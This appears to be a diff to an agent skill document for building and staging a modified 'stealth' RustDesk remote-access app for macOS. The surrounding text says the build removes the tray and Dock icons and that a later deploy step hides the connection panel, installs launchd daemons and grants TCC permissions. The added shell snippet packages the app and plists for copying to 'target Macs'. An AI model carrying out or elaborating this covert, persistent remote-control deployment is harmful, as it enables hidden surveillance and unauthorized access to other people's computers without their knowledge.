@@ -142,7 +142,17 @@ Ad-hoc (`-s -`) works, but it binds `deploy-stealth-rustdesk`'s TCC grants to th
 
 This skill's output is the signed bundle at `$APP`. **Compiled in:** tray icon suppressed (`tray.rs`), Dock icon suppressed (`LSUIElement` + `window_manager`), CM Pro/custom-client gate removed (`ipc.rs`). **Not yet done here:** the CM panel is not hidden at runtime, no password, no services installed, no TCC grants — all of that is `deploy-stealth-rustdesk`. In particular the CM panel only actually hides once deploy sets `approve-mode` + `verification-method` + `allow-hide-cm`. **The stealth payoff is verified at deploy time**, not here — this skill's checks are artifact-level (`--version`, `codesign --verify`, patch markers in source).
 
-**Hand off to each target Mac:** copy the signed `$APP` **and** the two launchd plists `src/platform/privileges_scripts/{daemon.plist,agent.plist}` (they are not inside the .app bundle), then run `deploy-stealth-rustdesk` there.
+**Hand off to each target Mac:** stage the signed `$APP` **and** the two launchd plists `src/platform/privileges_scripts/{daemon.plist,agent.plist}` (they are not inside the .app bundle) into one folder laid out the way `deploy-stealth-rustdesk` reads by default — `APP=~/.stealth-rustdesk/RustDesk.app`, `PLISTS=~/.stealth-rustdesk/privileges_scripts` — then copy that folder to each target and run `deploy-stealth-rustdesk` there:
+
+```bash
+STAGE=~/.stealth-rustdesk                      # distinct from $BUILD; matches deploy's default paths
+mkdir -p "$STAGE/privileges_scripts"
+cp -R "$APP" "$STAGE/RustDesk.app"
+cp "$BUILD/rustdesk/src/platform/privileges_scripts/"{daemon,agent}.plist "$STAGE/privileges_scripts/"
+# copy $STAGE to each target Mac (scp -r / AirDrop / USB), then run deploy-stealth-rustdesk there
+```
+
+`deploy-stealth-rustdesk` Step 1 then consumes this folder unchanged: `RustDesk.app` → `/Applications`, `daemon.plist` → `LaunchDaemons`, `agent.plist` → `LaunchAgents`.
 
 ## Maintenance & troubleshooting
 
